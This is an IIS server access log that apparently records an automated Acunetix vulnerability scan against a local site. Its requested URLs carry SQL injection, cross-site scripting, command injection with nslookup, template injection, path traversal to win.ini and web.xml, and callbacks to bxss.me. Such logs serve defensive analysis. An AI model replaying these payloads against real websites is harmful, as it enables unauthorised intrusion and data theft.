127.0.0.1, -, 3/23/2019, 1:48:12, W3SVC2, FIREPLACE, 127.0.0.1, 33, 178, 5299, 404, 2, GET, /downloads/site.tar, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 331, 5325, 404, 2, GET, /Vk1z17wi'));select pg_sleep(6); -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 267, 5269, 404, 2, GET, /@@g9nr5.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 233, 5269, 404, 2, GET, /'".html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 262, 5263, 404, 2, GET, /JyI=.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 266, 5259, 404, 2, GET, /??.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 270, 5273, 404, 2, GET, /?'?".html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 271, 5285, 404, 2, GET, /WEB-INF/web.xml.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5315, 404, 2, GET, /(select convert(int,CHAR(65))).html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 273, 5285, 404, 2, GET, /WEB-INF/web.xml.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 340, 5343, 404, 2, GET, /wYbCldEr'));select pg_sleep(12); -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 269, 5281, 404, 2, GET, /resource_9803.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5309, 404, 2, GET, /response.write(9881451*9509619)/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 251, 5297, 404, 2, GET, /http:/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 264, 5385, 404, 0, GET, /'+response.write(9881451*9509619)+'/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 320, 5315, 404, 2, GET, /downloads/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 268, 5405, 404, 0, GET, /"+response.write(9881451*9509619)+"/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 268, 5331, 404, 2, GET, /downloads/http:/hit5A74YG9HKn.bxss.me/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 260, 5263, 404, 2, GET, /PHIR21uy/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 240, 5277, 404, 2, GET, /set|set&set/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 306, 5315, 404, 2, GET, /acu6923＜s1﹥s2ʺs3ʹuca6923.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 320, 5315, 404, 2, GET, /downloads/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 249, 5287, 404, 2, GET, /$(nslookup 6JDw1G3g)/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 289, 5494, 403, 0, GET, /css/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5379, 404, 2, GET, /&nslookup H5ixNuKY&'/"`0&nslookup H5ixNuKY&`'/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 246, 5285, 404, 2, GET, /www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5317, 404, 2, GET, /acux8992谰z1兰z2a恇cxuca8992.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 255, 5494, 403, 0, GET, /css/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 289, 5494, 403, 0, GET, /css/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 308, 5291, 404, 2, GET, /downloads/4ftPYHi4.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 415, 5449, 404, 2, GET, /downloads<ScR<ScRiPt>IpT>Vdfm(9557)</sCr<ScRiPt>IpT>/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 416, 5425, 404, 2, GET, /喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡windows蜡win.ini/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 248, 5285, 404, 2, GET, /www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 252, 2118, 200, 0, GET, /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5263, 404, 2, GET, /wF2H5P1v/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 347, 5401, 404, 0, GET, /downloads/-1 OR 2+909-909-1=0+0+0+1 -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 251, 5371, 404, 0, GET, /${9999767+9999740}/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 284, 5335, 404, 2, GET, /{{9999171*10000351}}.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 347, 5401, 404, 0, GET, /downloads/-1 OR 3+909-909-1=0+0+0+1 -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 329, 5395, 404, 2, GET, /http:/some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 333, 5317, 404, 2, GET, /css' AND 2*3*8=6*8 AND '8KOk'='8KOk/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 339, 5393, 404, 0, GET, /downloads/-1 OR 2+446-446-1=0+0+0+1.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 253, 5249, 404, 2, GET, /)/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 341, 5357, 404, 2, GET, /css" AND 2*3*8=6*8 AND "KBGb"="KBGb/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 278, 5287, 404, 2, GET, /!(()&&!|*|*|/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 248, 5293, 404, 2, GET, /css&n914909=v955674/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5287, 404, 2, GET, /^(#$!@#$)(()))******/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 2, 342, 5323, 404, 2, GET, /css%' AND 2*3*8=6*8 AND 'xoXx'!='xoXx%/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 339, 5393, 404, 0, GET, /downloads/-1 OR 3+446-446-1=0+0+0+1.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 306, 5315, 404, 2, GET, /acu6104＜s1﹥s2ʺs3ʹuca6104.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 420, 5489, 404, 2, GET, /if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 348, 5403, 404, 0, GET, /downloads/-1' OR 2+183-183-1=0+0+0+1 -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 412, 5561, 404, 0, GET, /(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 282, 5307, 404, 2, GET, /................windowswin.ini/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 265, 5327, 404, 2, GET, /;print(md5(acunetix_wvs_security_test));/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 348, 5403, 404, 0, GET, /downloads/-1' OR 3+183-183-1=0+0+0+1 -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 322, 5277, 404, 2, GET, /windows/win.ini/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 323, 5301, 404, 2, GET, /1 waitfor delay '0:0:2' -- /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 288, 5317, 404, 2, GET, /Http:/testasp.vulnweb.com/t/fit.txt/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 360, 5423, 404, 0, GET, /downloads/-1' OR 2+18-18-1=0+0+0+1 or 'HHe6pvWD'='.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 360, 5423, 404, 0, GET, /downloads/-1' OR 3+18-18-1=0+0+0+1 or 'HHe6pvWD'='.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5317, 404, 2, GET, /acux1270谰z1兰z2a恇cxuca1270.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 350, 5413, 404, 0, GET, /downloads/-1" OR 2+215-215-1=0+0+0+1 -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 332, 5319, 404, 2, GET, /c86PtE2K'; waitfor delay '0:0:2' -- /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 283, 5333, 404, 2, GET, /{{9999145*9999129}}.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 274, 5337, 404, 2, GET, /';print(md5(acunetix_wvs_security_test));$a='/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 350, 5413, 404, 0, GET, /downloads/-1" OR 3+215-215-1=0+0+0+1 -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 267, 5277, 404, 2, GET, /WEB-INF/web.xml/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 333, 5321, 404, 2, GET, /FBk1UE9Y'); waitfor delay '0:0:2' -- /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 269, 5277, 404, 2, GET, /WEB-INF/web.xml/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 274, 5403, 404, 0, GET, /http:/testasp.vulnweb.com/t/xss.html?%00.jpg/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 434, 5519, 404, 2, GET, /downloads/if(now()=sysdate(),sleep(2),0)/*'XOR(if(now()=sysdate(),sleep(2),0))OR'"XOR(if(now()=sysdate(),sleep(2),0))OR"*/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 254, 5301, 404, 2, GET, /http:/hitGXKAoJ0C76.bxss.me/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 426, 5591, 404, 0, GET, /downloads/(select(0)from(select(sleep(2)))v)/*'+(select(0)from(select(sleep(2)))v)+'"+(select(0)from(select(sleep(2)))v)+"*/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 337, 5329, 404, 2, GET, /downloads/1 waitfor delay '0:0:4' -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 255, 5494, 403, 0, GET, /css/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 295, 5327, 404, 2, GET, /http:/testasp.vulnweb.com/t/fit.txt?.jpg/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 278, 5357, 404, 2, GET, /";print(md5(acunetix_wvs_security_test));$a="/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 346, 5347, 404, 2, GET, /downloads/I1DlABua'; waitfor delay '0:0:4' -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 393, 5405, 404, 2, GET, /resource<ScR<ScRiPt>IpT>Shrq(9221)</sCr<ScRiPt>IpT>.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 334, 5323, 404, 2, GET, /kofjTSla')); waitfor delay '0:0:2' -- /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 257, 5263, 404, 2, GET, /1'"/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 347, 5349, 404, 2, GET, /downloads/a6XtAfqm'); waitfor delay '0:0:4' -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 271, 5285, 404, 2, GET, /testasp.vulnweb.com/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 348, 5351, 404, 2, GET, /downloads/TsAJir0Z')); waitfor delay '0:0:4' -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 339, 5341, 404, 2, GET, /downloads/2OhCBKZE';select pg_sleep(4); -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 275, 5351, 404, 2, GET, /${@print(md5(acunetix_wvs_security_test))}/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5385, 404, 2, GET, /)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 241, 5277, 404, 2, GET, /www.vulnweb.com/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 231, 5259, 404, 2, GET, /903310/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 340, 5343, 404, 2, GET, /downloads/IwC2lmhg');select pg_sleep(4); -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 325, 5313, 404, 2, GET, /51suCJ7T';select pg_sleep(6); -- /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 255, 2118, 200, 0, GET, /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 247, 5289, 404, 2, GET, /http:/www.vulnweb.com/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 326, 5315, 404, 2, GET, /ecKthZch');select pg_sleep(6); -- /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 263, 5261, 404, 2, GET, /@@hGfVl/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 278, 5351, 404, 2, GET, /${@print(md5(acunetix_wvs_security_test))}/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 258, 5255, 404, 2, GET, /JyI=/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 262, 5251, 404, 2, GET, /??/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 327, 5317, 404, 2, GET, /iKRAUM2k'));select pg_sleep(6); -- /, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 2, 266, 5265, 404, 2, GET, /?'?"/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 446, 5571, 404, 0, GET, /%64%6F%77%6E%6C%6F%61%64%73%3C%53%63%52%69%50%74%20%3E%56%64%66%6D%289708%29%3C%2F%73%43%72%69%70%54%3E/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 266, 5327, 404, 2, GET, /project/http:/hitiu8FTYuVOs.bxss.me/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 242, 5277, 404, 2, GET, /www.vulnweb.com/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5307, 404, 2, GET, /(select convert(int,CHAR(65)))/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 229, 5261, 404, 2, GET, /'"/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 420, 5523, 404, 0, GET, /%72%65%73%6F%75%72%63%65%3C%53%63%52%69%50%74%20%3E%53%68%72%71%289271%29%3C%2F%73%43%72%69%70%54%3E.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 328, 5399, 404, 2, GET, /downloads/u003CScRiPt/Vdfm(9481)/u003C/sCripT/u003E/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 244, 5277, 404, 2, GET, /www.vulnweb.com/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 306, 5355, 404, 2, GET, /resource/u003CScRiPt/Shrq(9781)/u003C/sCripT/u003E.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 341, 5345, 404, 2, GET, /downloads/Q2x1R2LO'));select pg_sleep(6); -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 266, 5329, 404, 2, GET, /response.write(9474991*9099372)/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 311, 5381, 404, 2, GET, /resource&lt;ScRiPt&gt;Shrq(9539)&lt;/sCripT&gt;.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 260, 5263, 404, 2, GET, /css_9092/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 305, 5323, 404, 2, GET, /?img acu onmouseover=Shrq(9109) /?.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 318, 5311, 404, 2, GET, /project/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 274, 5405, 404, 0, GET, /'+response.write(9474991*9099372)+'/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 15, 303, 5324, 200, 0, GET, /project/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 278, 5425, 404, 0, GET, /"+response.write(9474991*9099372)+"/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 333, 5425, 404, 2, GET, /downloads&lt;ScRiPt&gt;Vdfm(9204)&lt;/sCripT&gt;/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 318, 5311, 404, 2, GET, /project/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 272, 5341, 404, 2, GET, /project/response.write(9350229*9601370)-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 326, 5365, 404, 2, GET, /?img acu onmouseover=Vdfm(9006) /?/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 250, 5297, 404, 2, GET, /set|set&set/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 280, 5417, 404, 0, GET, /project/'+response.write(9350229*9601370)+'-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 259, 5307, 404, 2, GET, /$(nslookup Xwyv90S8)/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 306, 5287, 404, 2, GET, /project/R9S9QKSN.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 4, 303, 3858, 200, 0, GET, /project/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 345, 5397, 404, 0, GET, /project/-1 OR 2+185-185-1=0+0+0+1 -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 270, 5283, 404, 2, GET, /bEbF6tSg/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 304, 5283, 404, 2, GET, /u9SFihS0/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 302, 5307, 404, 2, GET, /acu2653＜s1﹥s2ʺs3ʹuca2653/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 276, 5295, 404, 2, GET, /project/HcuIesJq-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 345, 5397, 404, 0, GET, /project/-1 OR 3+185-185-1=0+0+0+1 -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 300, 5321, 404, 2, GET, /[url=http:/www.vulnweb.com][/url].html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 300, 5399, 404, 2, GET, /&nslookup zgl4Vk8G&'/"`0&nslookup zgl4Vk8G&`'/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5309, 404, 2, GET, /acux6870谰z1兰z2a恇cxuca6870/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 284, 5437, 404, 0, GET, /project/"+response.write(9350229*9601370)+"-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 274, 5291, 404, 2, GET, /project/1-xCY4yAdq.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 347, 5345, 404, 2, GET, /project' AND 2*3*8=6*8 AND 'XDit'='XDit/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 279, 5325, 404, 2, GET, /{{9999393*9999678}}/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5309, 404, 2, GET, /project/set|set&set-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 302, 5307, 404, 2, GET, /acu3641＜s1﹥s2ʺs3ʹuca3641/, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 355, 5385, 404, 2, GET, /project" AND 2*3*8=6*8 AND "Zkhz"="Zkhz/1-001.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 337, 5389, 404, 0, GET, /project/-1 OR 2+748-748-1=0+0+0+1.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 307, 5375, 404, 2, GET, /resource}body{acu:Expre/**/SSion(Shrq(9638))}.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 265, 5319, 404, 2, GET, /project/$(nslookup rRi9ID9b)-001.html, -,
